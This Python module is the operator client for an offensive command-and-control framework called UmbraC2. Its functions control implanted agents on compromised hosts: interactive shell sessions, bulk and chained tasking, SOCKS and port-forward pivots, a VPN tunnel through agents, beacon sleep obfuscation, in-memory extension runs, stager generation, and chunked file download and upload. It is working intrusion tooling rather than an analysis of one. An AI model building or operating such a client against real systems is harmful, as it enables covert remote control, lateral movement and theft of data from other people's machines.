"""Operator-side client for the UmbraC2 team server.

The operator authenticates with its own token (never the agent PSK), which the
server maps to an operator identity.  All RPC traffic rides the same encrypted
frame format the implants use.
"""

from __future__ import annotations

import hashlib
import os
import queue
import socket
import threading
import time
from typing import Any, Callable, Dict, List, Optional

from . import crypto, handshake, netio, session, upk, wire

__all__ = ["OperatorClient", "OperatorError", "RpcResult", "CHUNK_MAX"]

# One transfer step never asks for more than the beacon's output budget (900 KiB,
# see implant/rust/src/task.rs), so each chunk fits in a single RESULT frame.
CHUNK_MAX = 900 * 1024


class OperatorError(Exception):
    pass


class RpcResult:
    """Result of one operator RPC."""

    __slots__ = ("ok", "data", "error")

    def __init__(self, ok: bool, data: Dict[str, Any], error: str = "") -> None:
        self.ok = ok
        self.data = data
        self.error = error

    def __repr__(self) -> str:  # pragma: no cover - debugging aid
        return f"RpcResult(ok={self.ok}, error={self.error!r})"


class OperatorClient:
    """Thread-safe RPC client with an asynchronous event stream."""

    def __init__(
        self,
        server: str,
        token: str,
        operator: str,
        *,
        timeout: float = 15.0,
        on_event: Optional[Callable[[Dict[str, Any]], None]] = None,
        verbose: bool = False,
        tls: bool = False,
        tls_ca: str = "",
        tls_server_name: str = "",
        tls_cert: str = "",
        tls_key: str = "",
    ) -> None:
        self.server = server
        self.operator = operator
        self._token = token.encode() if isinstance(token, str) else token
        self.timeout = timeout
        self.on_event = on_event
        self.verbose = verbose
        self.tls = tls
        self.tls_ca = tls_ca
        self.tls_server_name = tls_server_name
        self.tls_cert = tls_cert
        self.tls_key = tls_key

        self._stream: Optional[netio.Stream] = None
        self._session: Optional[session.Session] = None
        self._pending: Dict[int, "queue.Queue[Dict[str, Any]]"] = {}
        self._rid = 0
        self._lock = threading.Lock()
        self._reader: Optional[threading.Thread] = None
        self._closing = threading.Event()
        # Events are pushed to a bounded queue as well as to the callback, so
        # `umbra watch` can block on them without polling or a second thread.
        self._events: "queue.Queue[Dict[str, Any]]" = queue.Queue(maxsize=1024)
        self.session_id = b""
        self.server_meta: Dict[str, Any] = {}

    # -- lifecycle -------------------------------------------------------
    def connect(self) -> None:
        host, _, port = self.server.rpartition(":")
        if not host:
            raise OperatorError("server must be host:port")
        try:
            sock = socket.create_connection((host, int(port)), timeout=self.timeout)
        except OSError as exc:
            raise OperatorError(f"connect {self.server}: {exc}") from exc
        sock.settimeout(self.timeout)
        if self.tls:
            sock = self._wrap_tls(sock, host)
        self._stream = netio.Stream(sock, timeout=self.timeout)

        result = handshake.client_handshake(
            self._stream,
            psk=self._token,
            role=crypto.ROLE_OPERATOR,
            ident=self.operator,
            suite=wire.SUITE_AES256_GCM,
            meta={"client": "umbra-cli", "ver": "0.1.0"},
        )
        self._session = result.session
        self.session_id = result.session_id
        self.server_meta = result.meta
        self._stream.sock.settimeout(None)  # the reader thread owns the socket
        # Requests are written by the calling thread today, but routing them
        # through a gate keeps the "seal+write is one step" invariant explicit
        # if a background writer is ever added. See netio.SendGate.
        self._gate = netio.SendGate(self._session, self._stream)

        self._reader = threading.Thread(target=self._read_loop, name="umbra-events", daemon=True)
        self._reader.start()

    def close(self) -> None:
        self._closing.set()
        if self._stream:
            self._stream.close()
        if self._reader and self._reader.is_alive():
            self._reader.join(timeout=2)

    def __enter__(self) -> "OperatorClient":
        self.connect()
        return self

    def __exit__(self, *exc: Any) -> None:
        self.close()

    # -- tls -------------------------------------------------------------
    def _wrap_tls(self, sock: socket.socket, host: str) -> socket.socket:
        """Put TLS on the socket.

        The server may ask for a client certificate (mutual TLS): the
        operator then has to present one, otherwise the handshake fails and
        the server drops the connection.
        """
        import ssl

        ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=self.tls_ca or None)
        ctx.check_hostname = True
        ctx.verify_mode = ssl.CERT_REQUIRED
        if self.tls_cert:
            # Mutual TLS: the server asks for a certificate, so the operator
            # has to present one.  A missing key file is a configuration
            # mistake and worth a clear message.
            if not self.tls_key:
                raise OperatorError("a client certificate needs a private key (--tls-key)")
            try:
                ctx.load_cert_chain(self.tls_cert, self.tls_key)
            except (OSError, ssl.SSLError) as exc:
                raise OperatorError(f"client certificate {self.tls_cert} rejected: {exc}") from exc
        name = self.tls_server_name or host
        try:
            return ctx.wrap_socket(sock, server_hostname=name)
        except ssl.SSLError as exc:
            raise OperatorError(f"TLS handshake with {name} failed: {exc}") from exc
        except OSError as exc:
            raise OperatorError(f"TLS setup failed: {exc}") from exc

    # -- rpc -------------------------------------------------------------
    def rpc(self, cmd: str, args: Optional[Dict[str, Any]] = None) -> RpcResult:
        if self._session is None or self._stream is None:
            raise OperatorError("not connected")
        with self._lock:
            self._rid += 1
            rid = self._rid
            inbox: "queue.Queue[Dict[str, Any]]" = queue.Queue(maxsize=1)
            self._pending[rid] = inbox
        request = {"rid": rid, "cmd": cmd, "args": args or {}}
        try:
            self._gate.send(wire.MsgType.OP_REQUEST, request)
            try:
                resp = inbox.get(timeout=self.timeout)
            except queue.Empty:
                raise OperatorError(f"timeout waiting for {cmd!r}") from None
        finally:
            with self._lock:
                self._pending.pop(rid, None)
        data = resp.get("data") or {}
        return RpcResult(bool(resp.get("ok")), data, str(resp.get("err", "")))

    # -- events ----------------------------------------------------------
    def _read_loop(self) -> None:
        assert self._stream is not None and self._session is not None
        while not self._closing.is_set():
            try:
                raw = self._stream.recv_frame()
            except (OSError, netio.StreamError):
                break
            try:
                msg_type, body = self._session.decrypt_message(raw)
            except (session.SessionError, ValueError, upk.UpkError):
                break
            if msg_type == wire.MsgType.PADDING:
                # Padding frames carry random bytes and are ignored: they only
                # make the traffic shape uniform.
                continue
            if msg_type == wire.MsgType.OP_RESPONSE:
                rid = body.get("rid")
                with self._lock:
                    inbox = self._pending.get(rid if isinstance(rid, int) else int(rid or 0))
                if inbox is not None:
                    inbox.put(body)
            elif msg_type == wire.MsgType.OP_EVENT:
                try:
                    self._events.put_nowait(body)
                except queue.Full:
                    # A console that is not consuming events (a slow terminal)
                    # must not stall the reader: drop the oldest queued event.
                    try:
                        self._events.get_nowait()
                        self._events.put_nowait(body)
                    except queue.Empty:  # pragma: no cover - racy but harmless
                        pass
                if self.on_event:
                    try:
                        self.on_event(body)
                    except Exception:  # pragma: no cover - UI must never crash the link
                        pass
        self._closing.set()

    # -- convenience wrappers -------------------------------------------
    def agents(self, **filters: Any) -> List[Dict[str, Any]]:
        """The inventory, optionally narrowed by a filter.

        The filters are the ones the server understands: `state`, `transport`,
        `os`, `arch`, `tag` and `user`.  An empty filter is the whole
        inventory, so the call reads the same either way.
        """
        args = {key: value for key, value in filters.items() if value}
        res = self.rpc("agents.list", args)
        if not res.ok:
            raise OperatorError(res.error)
        return list(res.data.get("agents", []))

    def whoami(self) -> Dict[str, Any]:
        res = self.rpc("whoami")
        if not res.ok:
            raise OperatorError(res.error)
        return res.data

    def focus(self, agent_id: str) -> Dict[str, Any]:
        """Announce which agent this console is working on (empty clears it)."""
        res = self.rpc("operators.focus", {"id": agent_id})
        if not res.ok:
            raise OperatorError(res.error)
        return res.data

    def claim(self, task_id: str) -> Dict[str, Any]:
        """Take ownership of a task so teammates do not duplicate the work."""
        res = self.rpc("task.claim", {"task_id": task_id})
        if not res.ok:
            raise OperatorError(res.error)
        return res.data

    def release(self, task_id: str) -> Dict[str, Any]:
        """Drop a claim; the task stays queued for whoever picks it up next."""
        res = self.rpc("task.release", {"task_id": task_id})
        if not res.ok:
            raise OperatorError(res.error)
        return res.data

    def say(self, text: str, to: str = "") -> Dict[str, Any]:
        """Send a chat message; `to` addresses one operator instead of the team."""
        args: Dict[str, Any] = {"text": text}
        if to:
            args["to"] = to
        res = self.rpc("chat.send", args)
        if not res.ok:
            raise OperatorError(res.error)
        return res.data

    def chat_history(self, limit: int = 50) -> List[Dict[str, Any]]:
        res = self.rpc("chat.history", {"limit": limit})
        if not res.ok:
            raise OperatorError(res.error)
        return list(res.data.get("messages", []))

    def schedules(self) -> List[Dict[str, Any]]:
        res = self.rpc("schedule.list")
        if not res.ok:
            raise OperatorError(res.error)
        return list(res.data.get("schedules", []))

    def add_schedule(self, agent_id: str, kind: str, every: int, args: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        res = self.rpc("schedule.add", {"id": agent_id, "kind": kind, "every": every, "args": args or {}})
        if not res.ok:
            raise OperatorError(res.error)
        return res.data

    def remove_schedule(self, schedule_id: str) -> None:
        res = self.rpc("schedule.remove", {"schedule_id": schedule_id})
        if not res.ok:
            raise OperatorError(res.error)

    def operators(self) -> List[Dict[str, Any]]:
        res = self.rpc("operators.list")
        if not res.ok:
            raise OperatorError(res.error)
        return list(res.data.get("operators", []))

    def agent_info(self, agent_id: str) -> Dict[str, Any]:
        res = self.rpc("agents.info", {"id": agent_id})
        if not res.ok:
            raise OperatorError(res.error)
        return res.data

    def submit(self, agent_id: str, kind: str, args: Optional[Dict[str, Any]] = None) -> str:
        res = self.rpc("task.submit", {"id": agent_id, "kind": kind, "args": args or {}})
        if not res.ok:
            raise OperatorError(res.error)
        return str(res.data.get("task_id", ""))

    def task(self, task_id: str) -> Dict[str, Any]:
        res = self.rpc("task.get", {"task_id": task_id})
        if not res.ok:
            raise OperatorError(res.error)
        return res.data

    def tasks(self, agent_id: str = "", limit: int = 25,
              kind: str = "", state: str = "") -> List[Dict[str, Any]]:
        """The task history, narrowed by agent, kind and state."""
        args: Dict[str, Any] = {"limit": limit}
        if agent_id:
            args["id"] = agent_id
        if kind:
            args["kind"] = kind
        if state:
            args["state"] = state
        res = self.rpc("task.list", args)
        if not res.ok:
            raise OperatorError(res.error)
        return list(res.data.get("tasks", []))

    def stats(self) -> Dict[str, Any]:
        res = self.rpc("server.stats")
        if not res.ok:
            raise OperatorError(res.error)
        return res.data

    def next_event(self, timeout: Optional[float] = 3600.0) -> Optional[Dict[str, Any]]:
        """Return the next pushed event, or None if none arrives in time."""
        try:
            return self._events.get(timeout=timeout)
        except queue.Empty:
            return None

    def cancel(self, task_id: str) -> None:
        res = self.rpc("task.cancel", {"task_id": task_id})
        if not res.ok:
            raise OperatorError(res.error)

    def audit(self, limit: int = 50) -> Dict[str, Any]:
        """Recent operator actions, newest first.

        Returns the whole payload (``entries`` + ``enabled``) so the caller can
        tell "nothing has happened yet" from "auditing is switched off".
        """
        res = self.rpc("audit.tail", {"limit": limit})
        if not res.ok:
            raise OperatorError(res.error)
        return res.data

    def set_sleep(self, agent_id: str, sleep: int, jitter: int) -> None:
        res = self.rpc("agents.sleep", {"id": agent_id, "sleep": sleep, "jitter": jitter})
        if not res.ok:
            raise OperatorError(res.error)

    # -- bulk operations ------------------------------------------------
    def tag_agents(self, tags: List[str], mode: str = "add",
                   agents: Optional[List[str]] = None,
                   **filters: Any) -> Dict[str, Any]:
        """Label agents: `add`, `remove` or `set`."""
        args: Dict[str, Any] = {"tags": list(tags), "mode": mode}
        if agents:
            args["agents"] = list(agents)
        for key, value in filters.items():
            if value:
                args[key] = value
        res = self.rpc("agents.tag", args)
        if not res.ok:
            raise OperatorError(res.error)
        return res.data

    def set_policy(self, sleep: int, jitter: int, obfuscate: Optional[bool] = None,
                   agents: Optional[List[str]] = None,
                   **filters: Any) -> Dict[str, Any]:
        """Push the cadence (and the sleep obfuscation) to one or many agents."""
        args: Dict[str, Any] = {"sleep": sleep, "jitter": jitter}
        if obfuscate is not None:
            args["obfuscate"] = obfuscate
        if agents:
            args["agents"] = list(agents)
        for key, value in filters.items():
            if value:
                args[key] = value
        res = self.rpc("agents.policy", args)
        if not res.ok:
            raise OperatorError(res.error)
        return res.data

    def submit_bulk(self, kind: str, args: Optional[Dict[str, Any]] = None,
                    agents: Optional[List[str]] = None,
                    **filters: Any) -> List[Dict[str, Any]]:
        """Queue one task on many agents and return one row per agent."""
        payload: Dict[str, Any] = {"kind": kind, "args": args or {}}
        if agents:
            payload["agents"] = list(agents)
        for key, value in filters.items():
            if value:
                payload[key] = value
        res = self.rpc("task.bulk", payload)
        if not res.ok:
            raise OperatorError(res.error)
        return list(res.data.get("tasks", []))

    # -- interactive sessions and chains -------------------------------
    def open_session(self, agent_id: str, cmd: str = "") -> Dict[str, Any]:
        """Open an interactive session on an agent.

        The session is a process the operator writes to and reads from.  The
        task stays open while the session lives: the output arrives as
        `task.output` events, and the result is the exit status.
        """
        res = self.rpc("task.submit", {"id": agent_id, "kind": "session.open",
                                       "args": {"cmd": cmd}})
        if not res.ok:
            raise OperatorError(res.error)
        return res.data

    def session_input(self, agent_id: str, session: str, data: bytes) -> Dict[str, Any]:
        """Write to an open session."""
        res = self.rpc("task.submit", {"id": agent_id, "kind": "session.input",
                                       "args": {"session": session, "data": data}})
        if not res.ok:
            raise OperatorError(res.error)
        return res.data

    def close_session(self, agent_id: str, session: str) -> Dict[str, Any]:
        """Close an open session."""
        res = self.rpc("task.submit", {"id": agent_id, "kind": "session.close",
                                       "args": {"session": session}})
        if not res.ok:
            raise OperatorError(res.error)
        return res.data

    def submit_chain(self, agent_id: str, stages: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Queue a multi-stage task.

        The stages run one after the other on the same agent, and the output
        of a stage is substituted into the `{{output}}` placeholder of the
        arguments of the next one.
        """
        res = self.rpc("task.chain", {"id": agent_id, "stages": stages})
        if not res.ok:
            raise OperatorError(res.error)
        return res.data

    def alerts(self) -> List[Dict[str, Any]]:
        """The alert rules the server watches the event stream with."""
        res = self.rpc("alerts.list")
        if not res.ok:
            raise OperatorError(res.error)
        return list(res.data.get("alerts", []))

    # -- pivoting -------------------------------------------------------
    def pivot_list(self) -> List[Dict[str, Any]]:
        """Every open pivot tunnel and the number of live callback sessions."""
        res = self.rpc("pivot.list")
        if not res.ok:
            raise OperatorError(res.error)
        return list(res.data.get("tunnels", []))

    def pivot_sessions(self) -> int:
        """How many agents currently hold a callback session."""
        res = self.rpc("pivot.list")
        if not res.ok:
            raise OperatorError(res.error)
        return int(res.data.get("sessions", 0))

    def pivot_open(
        self,
        agent_id: str,
        *,
        mode: str = "socks",
        host: str = "",
        port: int = 0,
        listen: str = "",
    ) -> Dict[str, Any]:
        """Open a pivot through an agent.

        ``mode`` is ``socks`` (the client picks the target) or ``forward``
        (``host``/``port`` are fixed). The reply carries the local address the
        tunnel listens on.
        """
        res = self.rpc(
            "pivot.open",
            {
                "id": agent_id,
                "mode": mode,
                "host": host,
                "port": int(port),
                "listen": listen,
            },
        )
        if not res.ok:
            raise OperatorError(res.error)
        return res.data

    def pivot_close(self, tunnel_id: str) -> None:
        res = self.rpc("pivot.close", {"stream": tunnel_id})
        if not res.ok:
            raise OperatorError(res.error)

    # -- layer-3 tunnel --------------------------------------------------
    def vpn_status(self) -> Dict[str, Any]:
        res = self.rpc("vpn.status")
        if not res.ok:
            raise OperatorError(res.error)
        return res.data

    def vpn_peers(self) -> List[Dict[str, Any]]:
        res = self.rpc("vpn.peers")
        if not res.ok:
            raise OperatorError(res.error)
        return list(res.data.get("peers", []))

    def vpn_allocate(self, agent_id: str) -> str:
        """Reserve a tunnel address for an agent and return it."""
        res = self.rpc("vpn.allocate", {"id": agent_id})
        if not res.ok:
            raise OperatorError(res.error)
        return str(res.data.get("address", ""))

    # -- extension store -------------------------------------------------
    def armory_list(self) -> Dict[str, Any]:
        res = self.rpc("armory.list")
        if not res.ok:
            raise OperatorError(res.error)
        return res.data

    def armory_install(self, name: str) -> Dict[str, Any]:
        res = self.rpc("armory.install", {"name": name})
        if not res.ok:
            raise OperatorError(res.error)
        return res.data

    def armory_remove(self, name: str) -> None:
        res = self.rpc("armory.remove", {"name": name})
        if not res.ok:
            raise OperatorError(res.error)

    def armory_run(
        self,
        name: str,
        agent_id: str,
        args: Optional[Dict[str, Any]] = None,
    ) -> str:
        """Run an installed extension in memory on an agent."""
        res = self.rpc("armory.run", {"name": name, "id": agent_id, "args": args or {}})
        if not res.ok:
            raise OperatorError(res.error)
        return str(res.data.get("task_id", ""))

    # -- command namespace -----------------------------------------------
    def alias_list(self) -> List[Dict[str, Any]]:
        res = self.rpc("alias.list")
        if not res.ok:
            raise OperatorError(res.error)
        return list(res.data.get("aliases", []))

    def alias_run(
        self,
        name: str,
        agent_id: str,
        args: Optional[Dict[str, Any]] = None,
    ) -> str:
        """Run a saved command; the server expands it into a task."""
        res = self.rpc("alias.run", {"name": name, "id": agent_id, "args": args or {}})
        if not res.ok:
            raise OperatorError(res.error)
        return str(res.data.get("task_id", ""))

    # -- team ------------------------------------------------------------
    def team_sync(self) -> Dict[str, Any]:
        """One snapshot of the team: agents, operators and the chat log."""
        res = self.rpc("team.sync")
        if not res.ok:
            raise OperatorError(res.error)
        return res.data

    # -- stagers ---------------------------------------------------------
    def stager_generate(
        self,
        *,
        platform: str = "windows",
        transport: str = "tcp",
        server: str = "",
        url: str = "",
        sha256: str = "",
        agent_id: str = "",
    ) -> str:
        """Render a stager script for the requested platform."""
        res = self.rpc(
            "stager.generate",
            {
                "platform": platform,
                "transport": transport,
                "server": server,
                "url": url,
                "sha256": sha256,
                "agent_id": agent_id,
            },
        )
        if not res.ok:
            raise OperatorError(res.error)
        return str(res.data.get("stager", ""))

    # -- chunked file transfer -------------------------------------------
    def _run_transfer_step(self, agent_id: str, kind: str, args: Dict[str, Any], timeout: float) -> Dict[str, Any]:
        task_id = self.submit(agent_id, kind, args)
        task = self.wait_for_result(task_id, timeout=timeout)
        if task.get("state") != "done":
            raise OperatorError(str(task.get("err") or f"{kind} failed ({task.get('state')})"))
        return task

    def download_file(
        self,
        agent_id: str,
        remote: str,
        local: str,
        *,
        timeout: float = 120.0,
        chunk: int = CHUNK_MAX,
        progress: Optional[Callable[[int, int], None]] = None,
    ) -> Dict[str, Any]:
        """Pull `remote` from an agent to `local` in verified chunks.

        The file is written to ``local + ".part"`` and renamed only after every
        chunk hash and the final size check pass, so a failed or interrupted
        transfer never leaves a plausible-looking truncated file behind.
        """
        chunk = max(1, min(int(chunk), CHUNK_MAX))
        tmp = local + ".part"
        offset = 0
        total = -1
        digest = hashlib.sha256()
        try:
            with open(tmp, "wb") as fh:
                while True:
                    task = self._run_transfer_step(
                        agent_id,
                        "download",
                        {"path": remote, "offset": offset, "limit": chunk},
                        timeout,
                    )
                    data = task.get("out") or b""
                    if isinstance(data, str):
                        data = data.encode("utf-8", "surrogateescape")
                    data = bytes(data)
                    meta = task.get("meta") or {}
                    expected = str(meta.get("sha256", ""))
                    if expected and hashlib.sha256(data).hexdigest() != expected:
                        raise OperatorError(f"chunk at offset {offset} failed its hash check")
                    fh.write(data)
                    digest.update(data)
                    offset += len(data)
                    if meta.get("total") is not None:
                        total = int(meta["total"])
                    if progress is not None:
                        progress(offset, total)
                    eof = bool(meta.get("eof", not data))
                    if eof or not data:
                        break
        except BaseException:
            try:
                os.unlink(tmp)
            except OSError:
                pass
            raise
        if total >= 0 and offset != total:
            try:
                os.unlink(tmp)
            except OSError:
                pass
            raise OperatorError(f"short transfer: got {offset} of {total} bytes")
        os.replace(tmp, local)
        return {
            "path": remote,
            "local": local,
            "bytes": offset,
            "sha256": digest.hexdigest(),
            "chunks": (offset + chunk - 1) // chunk,
        }

    def upload_file(
        self,
        agent_id: str,
        local: str,
        remote: str,
        *,
        timeout: float = 120.0,
        chunk: int = CHUNK_MAX,
        progress: Optional[Callable[[int, int], None]] = None,
    ) -> Dict[str, Any]:
        """Push `local` to an agent in chunks, verified by a whole-file hash."""
        chunk = max(1, min(int(chunk), CHUNK_MAX))
        with open(local, "rb") as fh:
            blob = fh.read()
        total = len(blob)
        digest = hashlib.sha256(blob).hexdigest()
        offset = 0
        remote_hash = ""
        while True:
            piece = blob[offset : offset + chunk]
            eof = offset + len(piece) >= total
            task = self._run_transfer_step(
                agent_id,
                "upload",
                {"path": remote, "offset": offset, "data": piece, "eof": eof},
                timeout,
            )
            meta = task.get("meta") or {}
            remote_hash = str(meta.get("sha256", "")) or remote_hash
            offset += len(piece)
            if progress is not None:
                progress(offset, total)
            if eof:
                break
        if remote_hash and remote_hash != digest:
            raise OperatorError(f"remote file hash {remote_hash} != local {digest}")
        return {
            "path": remote,
            "local": local,
            "bytes": total,
            "sha256": digest,
            "chunks": max(1, (total + chunk - 1) // chunk),
        }

    def wait_for_result(self, task_id: str, timeout: float = 60.0, poll: float = 1.0) -> Dict[str, Any]:
        """Poll until a task leaves the queued/delivered state."""
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            data = self.task(task_id)
            if data.get("state") in ("done", "failed", "cancelled"):
                return data
            time.sleep(poll)
        raise OperatorError(f"timeout waiting for task {task_id}")
